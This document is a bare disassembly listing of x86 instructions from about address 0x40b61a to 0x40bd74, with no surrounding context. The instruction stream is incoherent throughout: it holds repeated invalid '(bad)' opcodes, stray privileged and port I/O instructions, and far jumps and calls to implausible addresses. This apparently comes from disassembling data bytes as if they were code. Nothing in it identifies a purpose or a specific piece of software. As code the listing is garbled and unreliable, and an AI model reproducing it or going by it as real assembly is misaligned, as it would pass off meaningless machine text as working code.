  40b61a:	mov    dh,0x2a
  40b61c:	(bad)  
  40b61d:	cld    
  40b61e:	aam    0xb0
  40b620:	mov    esp,0xd9d9812c
  40b625:	lock adc cl,BYTE PTR es:[eax]
  40b629:	push   eax
  40b62a:	mov    esi,DWORD PTR [esi+ebp*4-0x33ed08bf]
  40b631:	fbstp  TBYTE PTR ds:0x82331d15
  40b637:	pop    esp
  40b638:	int3   
  40b639:	xchg   edx,eax
  40b63a:	inc    edi
  40b63b:	mov    eax,0xb342f982
  40b640:	push   0x22
  40b642:	fwait
  40b643:	aaa    
  40b644:	fsub   st(5),st
  40b646:	xchg   esp,eax
  40b647:	cwde   
  40b648:	jo     0x40b610
  40b64a:	dec    ebp
  40b64b:	or     eax,0xcdb8ba67
  40b650:	and    BYTE PTR [ebp+0x5f9eb0b0],cl
  40b656:	cmc    
  40b657:	xor    eax,0xd4d57ad6
  40b65c:	cld    
  40b65d:	loop   0x40b6c8
  40b65f:	or     al,0x62
  40b661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b662:	jecxz  0x40b619
  40b664:	in     eax,0x99
  40b666:	xor    edx,edx
  40b668:	fsubr  DWORD PTR [edx-0x50db5ff3]
  40b66e:	cli    
  40b66f:	into   
  40b670:	pop    esi
  40b671:	mov    WORD PTR [esi+0x18e3065a],cs
  40b677:	inc    ecx
  40b678:	inc    edi
  40b679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b67a:	pop    es
  40b67b:	gs das 
  40b67d:	adc    BYTE PTR [edx+0x27],al
  40b680:	imul   esi,DWORD PTR [ebx+0x4c536eb7],0xa90e5f0b
  40b68a:	jmp    0x814bb39f
  40b68f:	add    DWORD PTR [esi-0x54],ebx
  40b692:	lahf   
  40b693:	mov    eax,ds:0x50402e0e
  40b698:	jae    0x40b6b3
  40b69a:	repz push edx
  40b69c:	xor    DWORD PTR [edi],0xffffffed
  40b69f:	mov    esi,0x9271ad29
  40b6a4:	sub    al,0xc2
  40b6a6:	push   esp
  40b6a7:	stos   BYTE PTR es:[edi],al
  40b6a8:	stos   BYTE PTR es:[edi],al
  40b6a9:	lods   al,BYTE PTR ds:[esi]
  40b6aa:	xor    esp,DWORD PTR [edi]
  40b6ac:	pop    esi
  40b6ad:	gs jnp 0x40b654
  40b6b0:	add    eax,0xcf35aa07
  40b6b5:	or     ah,BYTE PTR [edx+esi*2]
  40b6b8:	dec    edx
  40b6b9:	gs pop ds
  40b6bb:	jge    0x40b699
  40b6bd:	mov    ss,ebp
  40b6bf:	call   0xcbb:0xefc4afe7
  40b6c6:	clc    
  40b6c7:	clc    
  40b6c8:	add    edi,DWORD PTR [edi]
  40b6ca:	pop    ss
  40b6cb:	sbb    eax,0xbe7cc5fd
  40b6d0:	data16 test al,0x10
  40b6d3:	mov    DWORD PTR [eax+edx*4+0x6a5f1276],edi
  40b6da:	or     eax,0x20ff55fd
  40b6df:	add    BYTE PTR [edx+0x16],dl
  40b6e2:	mov    edi,0x16abf261
  40b6e7:	outs   dx,DWORD PTR ds:[esi]
  40b6e8:	add    eax,0xa837c278
  40b6ed:	add    DWORD PTR [edi+0x50],ebp
  40b6f0:	clc    
  40b6f1:	xlat   BYTE PTR ds:[ebx]
  40b6f2:	jl     0x40b70c
  40b6f4:	out    dx,eax
  40b6f5:	out    dx,eax
  40b6f6:	fwait
  40b6f7:	mov    esi,0xed19bcbb
  40b6fc:	scas   eax,DWORD PTR es:[edi]
  40b6fd:	sub    DWORD PTR [edx],eax
  40b6ff:	cs icebp 
  40b701:	adc    eax,0x133c67d1
  40b706:	vmwrite ebx,DWORD PTR [ebx+0x2d]
  40b70a:	lds    edx,FWORD PTR [edi-0x7b]
  40b70d:	xchg   ecx,eax
  40b70e:	or     al,0xa3
  40b710:	xor    dl,BYTE PTR [ecx-0x4bdc8adf]
  40b716:	fwait
  40b717:	mov    ds:0x54441784,eax
  40b71c:	pop    ds
  40b71d:	and    al,0x3d
  40b71f:	test   BYTE PTR [ecx],0xf7
  40b722:	inc    edi
  40b723:	xchg   ebp,eax
  40b724:	clc    
  40b725:	repz mov al,0xeb
  40b728:	dec    eax
  40b729:	aas    
  40b72a:	push   cs
  40b72b:	sahf   
  40b72c:	dec    edi
  40b72d:	adc    ebx,edx
  40b72f:	addr16 jns 0x40b6c2
  40b732:	sahf   
  40b733:	lahf   
  40b734:	lods   al,BYTE PTR ds:[esi]
  40b735:	pop    ss
  40b736:	jecxz  0x40b766
  40b738:	ss data16 and al,0x60
  40b73c:	dec    edx
  40b73d:	pop    esi
  40b73e:	pusha  
  40b73f:	push   ds
  40b740:	xchg   DWORD PTR [eax-0x7898dcb7],ebx
  40b746:	xchg   ebx,eax
  40b747:	test   DWORD PTR [esi+0x1b97eae0],esi
  40b74d:	inc    ebx
  40b74e:	lods   al,BYTE PTR ds:[esi]
  40b74f:	arpl   WORD PTR [edi],ax
  40b751:	push   cs
  40b752:	arpl   WORD PTR [esi],ax
  40b754:	and    BYTE PTR [esi+ebx*2+0x5bffeda2],ch
  40b75b:	mov    DWORD PTR [eax],0xd473bb0e
  40b761:	in     al,0x4d
  40b763:	or     eax,0xfe8bd3ba
  40b768:	cld    
  40b769:	iret   
  40b76a:	jle    0x40b78e
  40b76c:	jge    0x40b7a1
  40b76e:	pop    esi
  40b76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b770:	das    
  40b771:	(bad)  
  40b772:	(bad)  
  40b773:	lea    ebp,[edi-0x4d]
  40b776:	mov    ecx,0xd6c69283
  40b77b:	mov    ebx,0x304e9b40
  40b780:	cmp    DWORD PTR [edx-0x1a9f3e66],0x169a27f1
  40b78a:	lock je 0x40b71a
  40b78d:	cmp    al,BYTE PTR [ebx]
  40b78f:	adc    ebx,DWORD PTR [edi+0x33a300dd]
  40b795:	retf   
  40b796:	inc    edx
  40b797:	or     ecx,esi
  40b799:	jge    0x40b7d4
  40b79b:	sti    
  40b79c:	dec    edx
  40b79d:	loope  0x40b7a0
  40b79f:	lods   al,BYTE PTR ds:[esi]
  40b7a0:	mov    DWORD PTR [ebp-0x14d5b255],0x4c17d8fa
  40b7aa:	lock int3 
  40b7ac:	inc    esp
  40b7ad:	fistp  DWORD PTR [edx+0x31]
  40b7b0:	es sbb eax,ecx
  40b7b3:	xor    eax,DWORD PTR [eax+0x5f77407f]
  40b7b9:	jmp    0x7c4b532b
  40b7be:	into   
  40b7bf:	xor    al,0xdc
  40b7c1:	mov    al,0x9d
  40b7c3:	imul   esi,DWORD PTR [ecx],0x1dde36f6
  40b7c9:	mov    eax,DWORD PTR [eax+esi*2]
  40b7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7cd:	fwait
  40b7ce:	cmp    ah,BYTE PTR [ecx]
  40b7d0:	test   al,0x48
  40b7d2:	rcr    DWORD PTR [esi+0x6b06809f],1
  40b7d8:	fdiv   st(0),st
  40b7da:	dec    edx
  40b7db:	imul   eax,DWORD PTR [ecx],0xc136fdca
  40b7e1:	inc    edx
  40b7e2:	inc    edi
  40b7e3:	xchg   ecx,eax
  40b7e4:	(bad)  
  40b7e5:	int    0x53
  40b7e7:	lock push cs
  40b7e9:	je     0x40b814
  40b7eb:	mov    esp,0x193ea5ff
  40b7f0:	xor    bl,al
  40b7f2:	cmp    ch,bh
  40b7f4:	es jae 0x40b7c7
  40b7f7:	xor    BYTE PTR [ecx-0x644edb4c],0xe8
  40b7fe:	setnp  BYTE PTR [edx+esi*4-0x275d1246]
  40b806:	add    ebp,DWORD PTR [esp+eiz*4-0x7e047da8]
  40b80d:	mov    cl,0x48
  40b80f:	jns    0x40b795
  40b811:	lods   eax,DWORD PTR ds:[esi]
  40b812:	cld    
  40b813:	jbe    0x40b7f1
  40b815:	mov    ds:0xffcbc631,eax
  40b81a:	inc    ecx
  40b81b:	icebp  
  40b81c:	add    dl,BYTE PTR [edx-0x3269c0dc]
  40b822:	call   0x27e8bb9c
  40b827:	cmp    DWORD PTR [ebx-0x58],esi
  40b82a:	fcom   st(0)
  40b82c:	pop    edi
  40b82d:	ja     0x40b86e
  40b82f:	ret    0xe0a3
  40b832:	cld    
  40b833:	(bad)  
  40b835:	mov    BYTE PTR [eax+eiz*8],0x31
  40b839:	add    DWORD PTR ds:0xb60664cf,0xfffffff8
  40b840:	push   ebp
  40b841:	lods   al,BYTE PTR ds:[esi]
  40b842:	int3   
  40b843:	lods   al,BYTE PTR ds:[esi]
  40b844:	popa   
  40b845:	adc    eax,0x29bc59e4
  40b84a:	inc    ecx
  40b84b:	lock popa 
  40b84d:	push   eax
  40b84e:	push   ds
  40b84f:	pop    ebx
  40b850:	and    esp,0x78a0ee16
  40b856:	out    dx,eax
  40b857:	test   al,0xaa
  40b859:	mov    al,0xf7
  40b85b:	mov    ebx,0xc66edf6d
  40b860:	mov    WORD PTR ds:0x6352e6de,gs
  40b866:	push   ebx
  40b867:	inc    edx
  40b868:	pop    esi
  40b869:	mov    bh,0xf0
  40b86b:	jmp    0x40b86d
  40b86d:	mov    eax,ds:0xb1c0fca6
  40b872:	repnz and esp,esp
  40b875:	jnp    0x40b8e0
  40b877:	ins    DWORD PTR es:[edi],dx
  40b878:	dec    ebp
  40b879:	mov    BYTE PTR [esi-0x3727a96c],bh
  40b87f:	sahf   
  40b880:	aad    0x3b
  40b882:	mov    dl,0x4
  40b884:	add    al,0x32
  40b886:	std    
  40b887:	lds    edi,FWORD PTR [edi]
  40b889:	xor    ch,cl
  40b88b:	fstp   DWORD PTR [esi-0x47]
  40b88e:	inc    ecx
  40b88f:	imul   edi,DWORD PTR [eax-0x5ed73819],0xffffff90
  40b896:	sbb    cl,BYTE PTR [ecx-0x72]
  40b899:	(bad)  
  40b89a:	icebp  
  40b89b:	or     eax,0x7f156670
  40b8a0:	push   ds
  40b8a1:	rol    BYTE PTR [esp+edi*4+0x35],cl
  40b8a5:	or     al,0x85
  40b8a7:	mov    ecx,0x25921637
  40b8ac:	push   0xffffffed
  40b8ae:	hlt    
  40b8af:	mov    ch,0x40
  40b8b1:	rol    ebp,1
  40b8b3:	enter  0xb5cc,0x5b
  40b8b7:	mov    dh,0xdf
  40b8b9:	(bad)  [esi]
  40b8bb:	or     eax,0x71f2b17a
  40b8c0:	adc    al,0xe
  40b8c2:	ss cli 
  40b8c4:	lds    esp,FWORD PTR [esi]
  40b8c6:	cli    
  40b8c7:	ret    
  40b8c8:	frstor [edi-0x6ace963]
  40b8ce:	dec    esi
  40b8cf:	jmp    0x40b8ea
  40b8d1:	inc    eax
  40b8d2:	cli    
  40b8d3:	rol    ecx,1
  40b8d5:	push   0xffffffd5
  40b8d7:	sub    dl,BYTE PTR [edi+0x726ae451]
  40b8dd:	rcr    BYTE PTR [ecx],0x89
  40b8e0:	push   ecx
  40b8e2:	clc    
  40b8e3:	pop    esi
  40b8e4:	mov    ds:0x3e0cd26c,al
  40b8e9:	(bad)  
  40b8eb:	pusha  
  40b8ec:	jl     0x40b951
  40b8ee:	dec    ecx
  40b8ef:	and    BYTE PTR [ebx],0xfb
  40b8f2:	sbb    al,0xda
  40b8f4:	jns    0x40b887
  40b8f6:	mov    DWORD PTR [eax-0x7d49a86c],ebp
  40b8fc:	lahf   
  40b8fd:	stos   DWORD PTR es:[edi],eax
  40b8fe:	xchg   edx,eax
  40b8ff:	call   0xb390:0xfffd4a51
  40b906:	mov    dl,0x8f
  40b908:	nop
  40b909:	scas   eax,DWORD PTR es:[edi]
  40b90a:	call   0x8b52:0x23352422
  40b911:	rol    esi,cl
  40b913:	push   esp
  40b915:	xchg   esp,ebp
  40b917:	jecxz  0x40b966
  40b919:	fild   QWORD PTR [ebp+0x59cdc89c]
  40b91f:	icebp  
  40b920:	mov    al,0x27
  40b922:	cmp    DWORD PTR [edi+0x62ccb1ba],0xffffffd0
  40b929:	imul   ebx,edx,0xecb58897
  40b92f:	mov    edi,0x79af86ea
  40b934:	je     0x40b8c2
  40b936:	mov    bh,0xe7
  40b938:	inc    ebp
  40b939:	mov    esp,0x1f2c100b
  40b93e:	ret    0xdc27
  40b941:	test   edx,0x88f49156
  40b947:	xor    eax,0x9fdd2c36
  40b94c:	mov    ebp,0x38632f20
  40b951:	jge    0x40b94b
  40b953:	loope  0x40b939
  40b955:	mov    DWORD PTR [eax+ebx*8],edi
  40b958:	xor    dh,bl
  40b95a:	push   ecx
  40b95b:	pusha  
  40b95c:	scas   eax,DWORD PTR es:[edi]
  40b95d:	or     eax,0xce03250
  40b962:	sbb    eax,DWORD PTR [eax+0x44bdc9ff]
  40b968:	rol    BYTE PTR [ebp+ecx*8+0x57],1
  40b96c:	mov    DWORD PTR [ebx+0x7e],esp
  40b96f:	pusha  
  40b970:	jmp    0x108400c5
  40b975:	xor    eax,0x74d43ec1
  40b97a:	push   edi
  40b97b:	inc    ebx
  40b97c:	imul   eax,DWORD PTR [ebx+ebp*8-0x1ea8978a],0x33
  40b984:	arpl   WORD PTR [ebp+0x5d],cx
  40b987:	push   edx
  40b988:	call   0xd4a91382
  40b98d:	jne    0x40b9f0
  40b98f:	shr    DWORD PTR [edx],0x9b
  40b992:	and    eax,0x165956c2
  40b997:	(bad)  
  40b998:	fild   DWORD PTR [esi]
  40b99a:	sbb    esp,esi
  40b99c:	xchg   ecx,eax
  40b99d:	loop   0x40b974
  40b99f:	inc    ebp
  40b9a0:	jbe    0x40b947
  40b9a2:	(bad)  
  40b9a3:	or     ah,dl
  40b9a5:	push   edx
  40b9a6:	scas   eax,DWORD PTR es:[edi]
  40b9a7:	cli    
  40b9a8:	pop    esi
  40b9a9:	mov    ds:0xc5af75fa,eax
  40b9ae:	push   esp
  40b9af:	pop    ecx
  40b9b0:	popf   
  40b9b1:	inc    edx
  40b9b2:	xchg   ebp,eax
  40b9b3:	gs out 0x73,al
  40b9b6:	inc    esi
  40b9b7:	fsub   QWORD PTR [esi+0x64f3410d]
  40b9bd:	jp     0x40ba1d
  40b9bf:	jmp    0x81633b1f
  40b9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c5:	mov    bh,0xfa
  40b9c7:	outs   dx,DWORD PTR ds:[esi]
  40b9c8:	inc    ebp
  40b9c9:	stos   DWORD PTR es:[edi],eax
  40b9ca:	jl     0x40b952
  40b9cc:	outs   dx,BYTE PTR ds:[esi]
  40b9cd:	mov    al,BYTE PTR [ecx+0x7c]
  40b9d0:	push   ecx
  40b9d1:	stos   DWORD PTR es:[edi],eax
  40b9d2:	add    esp,DWORD PTR [ebp+0x17a25ec5]
  40b9d8:	jne    0x40b997
  40b9da:	cmp    ebx,DWORD PTR [eax]
  40b9dc:	adc    al,0x39
  40b9de:	ds sti 
  40b9e0:	add    al,0xaf
  40b9e2:	lods   al,BYTE PTR ds:[esi]
  40b9e3:	and    BYTE PTR [esi+ebx*1-0x44c8b942],bl
  40b9ea:	aas    
  40b9eb:	xor    BYTE PTR [esi+0x39835daf],cl
  40b9f1:	adc    al,dh
  40b9f3:	push   esi
  40b9f4:	mov    cl,0xff
  40b9f7:	inc    ecx
  40b9f8:	sub    ch,bl
  40b9fa:	mov    dl,0x45
  40b9fc:	fbstp  TBYTE PTR [eax-0x17]
  40b9ff:	xor    ch,dh
  40ba01:	sub    DWORD PTR [eax-0x17f64f4f],esp
  40ba07:	jns    0x40ba5f
  40ba09:	inc    edx
  40ba0a:	lods   eax,DWORD PTR ds:[esi]
  40ba0b:	xor    al,0xc4
  40ba0d:	fsubr  QWORD PTR ds:0xefc321e4
  40ba13:	inc    ebx
  40ba14:	pop    edx
  40ba15:	mov    ch,BYTE PTR [ecx+ecx*8-0x1f]
  40ba19:	mov    eax,DWORD PTR [ebx-0x7a3e400a]
  40ba1f:	popf   
  40ba20:	pop    ss
  40ba21:	sub    DWORD PTR [eax],esp
  40ba23:	cs test al,0x12
  40ba26:	jmp    0x9fc552a9
  40ba2b:	mov    esi,0xb4cc13e3
  40ba30:	pop    ds
  40ba31:	dec    eax
  40ba32:	pop    esp
  40ba33:	mov    cl,0x6b
  40ba35:	or     BYTE PTR [edi+0x611c4040],cl
  40ba3b:	out    0x36,eax
  40ba3d:	shl    DWORD PTR ds:0x3055f159,1
  40ba43:	push   cs
  40ba44:	jg     0x40ba3e
  40ba46:	jbe    0x40ba8c
  40ba48:	jl     0x40b9ee
  40ba4a:	cmp    al,0xca
  40ba4c:	fincstp 
  40ba4e:	inc    ebp
  40ba4f:	sbb    eax,0xe944c9e4
  40ba54:	ret    
  40ba55:	sub    ebp,edx
  40ba57:	imul   ebx,DWORD PTR [edx],0xf98a7e8c
  40ba5d:	mov    al,ds:0xbf0ae6e6
  40ba62:	imul   edx,esi,0x27f82768
  40ba68:	scas   al,BYTE PTR es:[edi]
  40ba69:	add    BYTE PTR [ebx-0x75],bl
  40ba6c:	inc    esi
  40ba6d:	mov    bh,0x86
  40ba6f:	mov    dl,0x7
  40ba71:	lahf   
  40ba72:	out    0x5c,al
  40ba74:	iret   
  40ba75:	inc    esp
  40ba76:	cdq    
  40ba77:	adc    BYTE PTR [ecx-0x21],ch
  40ba7a:	mov    BYTE PTR [ebx],bh
  40ba7c:	dec    esi
  40ba7d:	mov    eax,ds:0xba42176
  40ba82:	and    DWORD PTR [eax],0xffffff93
  40ba85:	hlt    
  40ba86:	popf   
  40ba87:	int3   
  40ba88:	mov    bh,0x8e
  40ba8a:	in     al,0x60
  40ba8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba8d:	mov    esp,0x762093cf
  40ba92:	mov    ebp,ds
  40ba94:	adc    edx,DWORD PTR ds:[edi+0x5a69a539]
  40ba9b:	in     eax,dx
  40ba9c:	dec    edx
  40ba9d:	pop    ebx
  40ba9e:	push   es
  40ba9f:	push   esp
  40baa0:	int3   
  40baa1:	mov    esp,0x51888938
  40baa6:	and    bh,BYTE PTR [edx-0x22]
  40baa9:	or     BYTE PTR [edx+eiz*4-0x4fddf96e],dl
  40bab0:	ins    DWORD PTR es:[edi],dx
  40bab1:	clc    
  40bab2:	xchg   ebp,eax
  40bab3:	push   0xffffffe3
  40bab5:	in     al,dx
  40bab6:	aam    0x12
  40bab8:	out    0x6f,eax
  40baba:	push   esi
  40babb:	mov    BYTE PTR [ebx],0x4d
  40babe:	mov    cl,0xd8
  40bac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bac1:	xchg   esi,eax
  40bac2:	jge    0x40ba64
  40bac4:	sbb    esp,DWORD PTR ds:0x180bf8d
  40baca:	aas    
  40bacb:	mov    ds:0xeb516bd0,al
  40bad0:	adc    eax,0xfd72b784
  40bad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad6:	pop    ebp
  40bad7:	jo     0x40bae9
  40bad9:	ror    DWORD PTR [edx-0x61d8c15],1
  40badf:	dec    ebp
  40bae0:	pop    es
  40bae1:	ins    DWORD PTR es:[edi],dx
  40bae2:	fadd   QWORD PTR [edi]
  40bae4:	mov    esi,0x230c0d8e
  40bae9:	mov    edi,0xfff2585a
  40baee:	or     ebp,DWORD PTR [edi-0x2]
  40baf1:	ret    0xa86d
  40baf4:	adc    eax,0x4d13dffb
  40baf9:	in     al,dx
  40bafa:	jnp    0x40bad8
  40bafc:	(bad)  
  40bafd:	in     eax,dx
  40bafe:	push   esi
  40baff:	aad    0x77
  40bb01:	lods   eax,DWORD PTR ds:[esi]
  40bb02:	dec    edx
  40bb03:	ins    BYTE PTR es:[edi],dx
  40bb04:	xchg   ecx,eax
  40bb05:	pop    ebx
  40bb06:	ficom  WORD PTR ds:0xbfb91b7d
  40bb0c:	mov    edx,0xd885b7b2
  40bb11:	std    
  40bb12:	lock xor BYTE PTR [eax-0x549c9eb3],0xf2
  40bb1a:	lods   al,BYTE PTR ds:[esi]
  40bb1b:	sbb    al,0x8a
  40bb1d:	jle    0x40bb91
  40bb1f:	das    
  40bb20:	push   ebx
  40bb21:	mov    edi,0xf60ee1de
  40bb26:	or     al,0xba
  40bb28:	arpl   WORD PTR [eiz*4-0x18c4d228],sp
  40bb2f:	rcl    DWORD PTR [ebx-0x77],cl
  40bb32:	jnp    0x40bbaa
  40bb34:	or     DWORD PTR [edx-0x71],ebx
  40bb37:	or     al,0x13
  40bb39:	xor    ch,cl
  40bb3b:	pop    es
  40bb3c:	fisttp WORD PTR [ecx+edi*8+0x26]
  40bb40:	pusha  
  40bb41:	push   0x5fd8d3a9
  40bb46:	jb     0x40bad4
  40bb48:	jmp    0xadb:0xea958d6c
  40bb4f:	stc    
  40bb50:	int3   
  40bb51:	pop    ds
  40bb52:	mov    eax,ds:0x969422d
  40bb57:	jg     0x40bb69
  40bb59:	ficom  DWORD PTR [edi]
  40bb5b:	xchg   ebx,eax
  40bb5c:	je     0x40bb02
  40bb5e:	jmp    0x3706:0xeaa49867
  40bb65:	xchg   ebx,eax
  40bb66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb67:	cmp    edi,DWORD PTR [eax-0x79]
  40bb6a:	out    dx,eax
  40bb6b:	mov    bh,BYTE PTR [ebx+0x74]
  40bb6e:	sub    eax,0xe8a8dc79
  40bb73:	aam    0x43
  40bb75:	pop    ss
  40bb76:	retf   
  40bb77:	adc    DWORD PTR [ebx-0x7ad12935],esi
  40bb7d:	and    eax,DWORD PTR [ecx-0x7a]
  40bb80:	loop   0x40bbc1
  40bb82:	stos   DWORD PTR es:[edi],eax
  40bb83:	mov    BYTE PTR [ebx-0x52c9926d],bh
  40bb89:	or     dl,ch
  40bb8b:	mov    bh,BYTE PTR [edi]
  40bb8d:	(bad)  
  40bb8e:	test   ch,0xbd
  40bb91:	mov    DWORD PTR [ebx-0x4a],ebp
  40bb94:	aad    0x40
  40bb96:	pop    eax
  40bb97:	daa    
  40bb98:	loopne 0x40bc11
  40bb9a:	bound  ecx,QWORD PTR [edi+ebx*8]
  40bb9d:	pop    eax
  40bb9e:	out    0xb5,al
  40bba0:	add    eax,eax
  40bba2:	xchg   ebx,eax
  40bba3:	mov    ah,0x31
  40bba5:	adc    ecx,DWORD PTR [edx+0x213b7f37]
  40bbab:	xchg   BYTE PTR [edx-0x6a],ch
  40bbae:	pusha  
  40bbaf:	fld    QWORD PTR [edx-0x39]
  40bbb2:	shl    BYTE PTR [edi-0x36],1
  40bbb5:	scas   al,BYTE PTR es:[edi]
  40bbb6:	lahf   
  40bbb7:	xor    dl,BYTE PTR [eax+0x4efea115]
  40bbbd:	dec    DWORD PTR [ecx+ebx*2+0x580e695e]
  40bbc4:	outs   dx,BYTE PTR ds:[esi]
  40bbc5:	pushf  
  40bbc6:	mov    bh,0x9f
  40bbc8:	clc    
  40bbc9:	sbb    dh,BYTE PTR [esi+ecx*2-0x4dbe112]
  40bbd0:	dec    ebx
  40bbd1:	neg    BYTE PTR [edx]
  40bbd3:	cmp    dh,ch
  40bbd5:	fild   DWORD PTR [eax-0x79]
  40bbd8:	pushf  
  40bbd9:	adc    al,0x3f
  40bbdb:	xchg   edi,eax
  40bbdc:	lock inc ebx
  40bbde:	mov    ebx,0x4fde66df
  40bbe3:	sbb    ebp,DWORD PTR [eax+0x5a98efd7]
  40bbe9:	push   ss
  40bbea:	inc    ebp
  40bbeb:	clc    
  40bbec:	shl    DWORD PTR [esi],cl
  40bbee:	inc    eax
  40bbef:	mov    al,ds:0x737c7b0a
  40bbf4:	les    sp,DWORD PTR [edi-0x32d33392]
  40bbfb:	add    BYTE PTR [esi+esi*4],bl
  40bbfe:	sub    BYTE PTR [ebx+0x4b],dl
  40bc01:	sbb    DWORD PTR [edx+0x35],ebp
  40bc04:	fwait
  40bc05:	icebp  
  40bc06:	adc    eax,0x951d83fa
  40bc0b:	xchg   edx,eax
  40bc0c:	pop    ebp
  40bc0d:	arpl   WORD PTR [ebx-0x405dc8fd],bx
  40bc13:	push   ebp
  40bc14:	test   DWORD PTR [eax+0x5d],eax
  40bc17:	fsub   st(6),st
  40bc19:	pop    DWORD PTR [ebx+0x16c7f0ea]
  40bc1f:	inc    ebx
  40bc20:	es pop esp
  40bc22:	mov    ch,0xc0
  40bc24:	jns    0x40bbce
  40bc26:	push   ds
  40bc27:	nop
  40bc28:	fidivr DWORD PTR [edi+edi*1+0x9]
  40bc2c:	(bad)  
  40bc2d:	sbb    dh,BYTE PTR [edi+0x7]
  40bc30:	xchg   edx,eax
  40bc31:	xor    dh,bl
  40bc33:	sti    
  40bc34:	mov    al,0xbc
  40bc36:	mov    bh,0xa6
  40bc38:	sbb    dl,dh
  40bc3a:	adc    al,0x92
  40bc3c:	shl    bl,0x46
  40bc3f:	xchg   edi,eax
  40bc40:	imul   edx,DWORD PTR ds:0x1bda65f2,0x55
  40bc47:	bsf    edi,ebx
  40bc4a:	or     ebp,eax
  40bc4c:	sub    al,0x25
  40bc4e:	adc    eax,DWORD PTR [ecx-0x63]
  40bc51:	ja     0x40bc1f
  40bc53:	xor    eax,0xff4f9f41
  40bc58:	ins    DWORD PTR es:[edi],dx
  40bc59:	adc    al,0xfe
  40bc5b:	or     DWORD PTR [ebx],esp
  40bc5d:	sti    
  40bc5e:	pop    ebp
  40bc5f:	jae    0x40bc06
  40bc61:	test   ch,cl
  40bc63:	out    dx,eax
  40bc64:	dec    ebp
  40bc65:	nop
  40bc66:	cs cmp ebx,edx
  40bc69:	push   0xde767f9b
  40bc6e:	loopne 0x40bc53
  40bc70:	or     BYTE PTR [eax],dl
  40bc72:	and    eax,0x715e205c
  40bc77:	in     al,0xc5
  40bc79:	add    al,0xc8
  40bc7b:	jg     0x40bcd9
  40bc7d:	and    DWORD PTR [esi+0x1e],0x7d
  40bc81:	jmp    0x40bc26
  40bc83:	mov    bl,0x7f
  40bc85:	xchg   esp,eax
  40bc86:	pop    esi
  40bc87:	dec    esp
  40bc88:	(bad)  
  40bc89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc8a:	add    DWORD PTR [ebx-0x9888047],edi
  40bc90:	dec    esp
  40bc91:	xor    BYTE PTR [edx],ch
  40bc93:	dec    esp
  40bc94:	sub    BYTE PTR [eax-0x45],0xcd
  40bc98:	mov    eax,ds:0xd8b36ab7
  40bc9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9e:	pop    ebx
  40bc9f:	repz pop ebp
  40bca1:	lock mov dh,0x35
  40bca4:	adc    BYTE PTR [edx-0x7b9720d3],ah
  40bcaa:	arpl   WORD PTR [ecx-0x67],dx
  40bcad:	scas   eax,DWORD PTR es:[edi]
  40bcae:	push   edi
  40bcaf:	pop    esp
  40bcb0:	pop    ds
  40bcb1:	xchg   ebp,eax
  40bcb2:	add    ebx,eax
  40bcb4:	inc    edx
  40bcb5:	xchg   esp,eax
  40bcb6:	cmp    bh,dl
  40bcb8:	test   DWORD PTR [esi+0x2a],ebx
  40bcbb:	push   edi
  40bcbc:	inc    ebx
  40bcbd:	xor    eax,0x4850e531
  40bcc2:	xchg   edx,eax
  40bcc3:	sbb    al,0x43
  40bcc5:	test   BYTE PTR [eax+ebp*4+0x32],bh
  40bcc9:	mov    WORD PTR [esp+eiz*4+0x7fee40fe],gs
  40bcd0:	cs popf 
  40bcd2:	and    eax,0x8c30a7ce
  40bcd7:	sbb    al,0xd0
  40bcd9:	or     ah,cl
  40bcdb:	fnsave [ebx]
  40bcdd:	enter  0xd11d,0x63
  40bce1:	pop    ds
  40bce2:	sbb    esp,DWORD PTR [ebp-0x8df2fc2]
  40bce8:	rcr    BYTE PTR [eax+0x31],cl
  40bceb:	dec    esp
  40bcec:	fld    QWORD PTR [esi]
  40bcee:	or     ch,BYTE PTR ds:0xb1a783b6
  40bcf4:	stos   DWORD PTR es:[edi],eax
  40bcf5:	mov    ah,0x35
  40bcf7:	mov    bl,0xad
  40bcf9:	jle    0x40bc9b
  40bcfb:	pop    eax
  40bcfc:	test   BYTE PTR [edi],ah
  40bcfe:	test   esi,0xb5503a36
  40bd04:	or     ebp,DWORD PTR [edi+0x659f5841]
  40bd0a:	hlt    
  40bd0b:	dec    esp
  40bd0c:	pop    edi
  40bd0d:	imul   ebp,DWORD PTR [edx-0x2d67cad9],0x1e
  40bd14:	jbe    0x40bd52
  40bd16:	les    ecx,FWORD PTR [eax+0x29]
  40bd19:	xor    DWORD PTR [ecx],0xe47d7858
  40bd1f:	and    DWORD PTR [esi+0x48c90bfa],eax
  40bd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd26:	cli    
  40bd27:	bound  esi,QWORD PTR [ebx-0x33]
  40bd2a:	xor    eax,0x2941e36e
  40bd2f:	sub    ebx,ecx
  40bd31:	xor    bh,BYTE PTR [esi-0x1302ca]
  40bd37:	push   ebp
  40bd38:	or     bh,BYTE PTR [edi-0x79b98131]
  40bd3e:	sahf   
  40bd3f:	std    
  40bd40:	and    eax,0x2d645c2
  40bd45:	in     al,dx
  40bd46:	ins    DWORD PTR es:[edi],dx
  40bd47:	mov    edi,0x332d7412
  40bd4c:	stos   BYTE PTR es:[edi],al
  40bd4d:	xchg   edx,eax
  40bd4e:	xor    al,0x9b
  40bd50:	nop
  40bd51:	enter  0xa7c5,0xc0
  40bd55:	inc    edi
  40bd56:	dec    DWORD PTR [edi]
  40bd58:	sbb    al,0x7
  40bd5a:	mov    DWORD PTR [eax-0x56fa9a8c],ebx
  40bd60:	daa    
  40bd61:	inc    edx
  40bd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd63:	hlt    
  40bd64:	cld    
  40bd65:	jp     0x40bd98
  40bd67:	add    al,0x6a
  40bd69:	data16 aaa 
  40bd6b:	lock inc edi
  40bd6d:	mov    ecx,0x86247b4f
  40bd72:	repz pusha 
  40bd74:	mov    DWORD PTR [esi-0x17377755],esi
